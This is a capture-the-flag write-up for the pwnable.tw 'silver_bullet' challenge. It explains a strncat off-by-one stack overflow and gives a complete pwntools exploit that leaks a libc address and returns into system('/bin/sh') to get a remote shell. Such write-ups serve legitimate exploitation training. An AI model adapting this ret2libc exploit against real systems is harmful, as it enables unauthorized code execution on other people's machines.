# 📌 silver_bullet - pwnable.tw

## 🔹 Vulnerability Analysis
### 📌 **Vulnerable Function: `strncat`**
The vulnerability resides in the **`strncat` function**, which is used for concatenating user-controlled input when "powering up" the bullet.

---

### 🛠️ **Breakdown of the Issue**
- The program allows creating **only one bullet** with a **maximum size of `0x30`** bytes.
- The **initial power** is determined by the length of the **first provided description**.
- When **powering up**, the new description is **concatenated** with the existing one.
- The problem arises from **`strncat`**, which expects a **destination buffer** of **size `n+1`**, since it writes `n` bytes and **appends a null terminator (`\x00`)**.
- If we concatenate **exactly `0x30` bytes**, the **31st (`0x31`) byte gets null-terminated**.
- The program then **updates the power level** based on the length of **only the new input**, instead of the full concatenated buffer.

---

### 💥 **Impact: Buffer Overflow**
This logic flaw **allows a buffer overflow**:
- **We can overwrite the return address**, which is **8 bytes past the power variable**.
- Since **the power variable is incorrectly updated**, we **can exceed `0x30` bytes** and write beyond the buffer.

---

### 🏴 **Exploitation Plan**
1. **Leak a libc address**  
   - Overwrite the return address to leak an address from the **libc**.
2. **Calculate `system` address**  
   - Using the leaked libc address, compute the base address and derive `system()`.
3. **Overwrite return address with `system()`**  
   - Redirect execution to `system("/bin/sh")`, gaining a shell.


## 🔹 Exploit Code
```python
#!/usr/bin/python3.10
from pwn import *

# p = process("./silver_bullet_patched")  
p = remote("chall.pwnable.tw", 10103)  


elf = ELF("./libc_32.so.6")


def create_bullet(p, desc):
    p.sendlineafter("Your choice :", "1")
    p.sendafter("bullet :", desc)
    p.recvuntil("Your power is : ")
    return int(p.recvline().strip().decode())

def power_up(p, desc):
    p.sendlineafter("Your choice :", "2")
    p.sendafter("bullet :", desc)
    p.recvuntil("new power is : ")
    return int(p.recvline().strip().decode())

def beat(p):
    p.sendlineafter("Your choice :", "3")
    p.recvuntil("HP : ")
    p.recvline()


power = create_bullet(p, 'A' * 47)
print(f"Initial power: {power}")


power = power_up(p, 'B' * (48 - power))

# overwrite ret addr
payload = b"\xff\xff\xff"
payload += b"a" * 4  # Padding
payload += p32(0x8048733, "little")  # return to beat function so it can leak libc addr
payload += p32(0x08048954, "little") # saved return ptr to main
payload += p32(0x804afd4, "little")  # param1
payload += p32(0x804b01c, "little")  # param2

power = power_up(p, payload)

# Leak libc addr
beat(p)
p.recvuntil("+ NAME : ")
leak = p.recvline().strip()
libc_leak = int.from_bytes(leak[4:8], "little")

print(f"Leaked libc address: {hex(libc_leak)}")

# system() addr
libc_offset = 0x175ca7  # Offset from leak to system
system_addr = libc_leak - libc_offset
libc_base = system_addr - elf.symbols["system"]

print(f"system() address: {hex(system_addr)}")
print(f"Libc base: {hex(libc_base)}")

power = create_bullet(p, 'A' * 47)
power_up(p, 'B' * (48 - power))

payload = b"\xff\xff\xff"
payload += b"a" * 4  # Padding
payload += p32(system_addr, "little")
payload += p32(system_addr, "little")
payload += p32(libc_base + 0x158e8b, "little")  # "/bin/sh" address

power_up(p, payload)


beat(p)


p.interactive()
